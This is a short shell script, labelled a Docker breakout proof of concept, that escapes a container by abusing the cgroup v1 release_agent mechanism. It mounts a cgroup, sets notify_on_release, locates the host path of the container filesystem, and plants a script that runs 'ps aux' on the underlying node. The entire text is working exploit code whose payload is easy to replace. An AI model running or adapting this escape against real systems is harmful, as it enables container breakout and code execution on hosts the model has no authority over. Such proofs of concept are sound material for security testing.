# docker breakout poc2                                                                                            
# if conditions are correct, this script                                                                          
# will execute "ps" on underlying node                                                                            
                                                                                                                  
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x                                  
                                                                                                                  
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/tmp/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
